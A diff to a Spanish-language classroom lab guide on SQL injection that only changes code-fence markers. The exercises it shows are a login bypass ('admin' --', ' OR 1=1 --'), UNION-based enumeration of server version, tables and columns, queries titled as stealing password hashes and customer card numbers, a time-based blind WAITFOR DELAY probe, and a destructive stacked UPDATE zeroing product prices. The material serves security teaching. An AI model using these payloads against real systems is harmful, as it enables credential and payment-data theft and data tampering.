@@ -118,19 +118,19 @@ cómo su entrada se convierte en código.
 
 2. **Rompe la gramática con un solo carácter.** Ahora en **Password** escribí una
    única comilla:
-   ```
+   ```text
    '
    ```
    No es un exploit ni un payload: es un signo de puntuación. Y el motor contesta
    hablando de una consulta que el alumno no escribió:
-   ```
+   ```text
    (105, b"Unclosed quotation mark after the character string '''... )
    ```
    **Este es el paso que conviene dejar en pantalla.** Acá se entiende, sin que
    haya que explicarlo, que la entrada se está evaluando como código.
 
 3. **Ahora sí, el bypass.** En **Usuario** escribí:
-   ```
+   ```text
    admin' --
    ```
    con cualquier cosa en contraseña. Acceso concedido. Y el `--` ya no es magia:
@@ -142,7 +142,7 @@ cómo su entrada se convierte en código.
    pueden, no entendieron: memorizaron.
 
 4. Prueba también:
-   ```
+   ```text
    ' OR 1=1 --
    ```
    ¿Qué usuario quedó autenticado y por qué ese?
@@ -154,35 +154,35 @@ cómo su entrada se convierte en código.
 Todo esto va en el campo **Buscar producto** (`/buscar?q=`).
 
 1. **Contar columnas.** Prueba `ORDER BY` incrementando el número hasta que falle:
-   ```
+   ```text
    ' ORDER BY 3 --
    ' ORDER BY 4 --
    ```
    ¿Cuántas columnas tiene la consulta original?
 
 2. **Confirmar el `UNION`** con el número correcto de columnas:
-   ```
+   ```text
    ' UNION SELECT NULL, NULL, NULL --
    ```
 
 3. **Leer metadatos del servidor:**
-   ```
+   ```text
    ' UNION SELECT @@version, DB_NAME(), NULL --
    ```
 
 4. **Enumerar tablas y columnas** (catálogo estándar de información):
-   ```
+   ```text
    ' UNION SELECT TABLE_NAME, TABLE_SCHEMA, NULL FROM INFORMATION_SCHEMA.TABLES --
    ' UNION SELECT COLUMN_NAME, TABLE_NAME, NULL FROM INFORMATION_SCHEMA.COLUMNS --
    ```
 
 5. **Robar credenciales:**
-   ```
+   ```text
    ' UNION SELECT Usuario, PasswordHash, Id FROM Usuarios --
    ```
 
 6. **Robar datos sensibles de clientes:**
-   ```
+   ```text
    ' UNION SELECT Nombre, Tarjeta, NULL FROM Clientes --
    ```
 
@@ -191,13 +191,13 @@ Todo esto va en el campo **Buscar producto** (`/buscar?q=`).
 ### Práctica C — Ciega por tiempo y apilada (demostración del profesor + prueba)
 
 1. **Ciega por tiempo** (en Buscar). Si no hubiera salida visible, el atacante aún puede confirmar la inyección midiendo el retardo:
-   ```
+   ```text
    '; WAITFOR DELAY '0:0:5' --
    ```
    La respuesta tarda 5 segundos. Explica por qué esto sirve aunque no se vea ningún dato.
 
 2. **Consulta apilada** (demostrar con cuidado; es destructivo en el lab):
-   ```
+   ```text
    '; UPDATE Productos SET Precio = 0; --
    ```
    Vuelve a buscar y observa los precios en cero. Comenta qué habría pasado con
